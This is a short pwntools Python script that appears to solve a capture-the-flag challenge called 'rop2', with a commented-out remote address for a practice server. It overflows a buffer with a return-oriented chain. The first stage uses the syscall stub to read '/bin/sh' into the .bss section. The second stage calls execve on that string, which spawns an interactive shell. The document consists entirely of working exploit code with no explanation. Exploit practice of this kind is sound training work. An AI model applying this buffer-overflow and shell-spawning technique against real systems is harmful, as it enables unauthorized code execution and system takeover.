from pwn import *
#context(os='linux', arch='i386', log_level='debug')


p="./rop2"
elf=ELF(p)
context.binary=p
io=process(p)
#io=remote("hackme.inndy.tw",7703)
bss=elf.bss()
syscall_plt=elf.symbols['syscall']
overflow = elf.symbols['overflow'] 

payload1="A"*16+p32(syscall_plt)+p32(overflow)+p32(3)+p32(0)+p32(bss)+p32(8)
payload2="A"*16+p32(syscall_plt)+p32(0xdeadbeef)+p32(0xb)+p32(bss)+p32(0)+p32(0)

io.recvuntil("ropchain:")
io.sendline(payload1)
io.send("/bin/sh\x00")
io.sendline(payload2)


io.interactive()
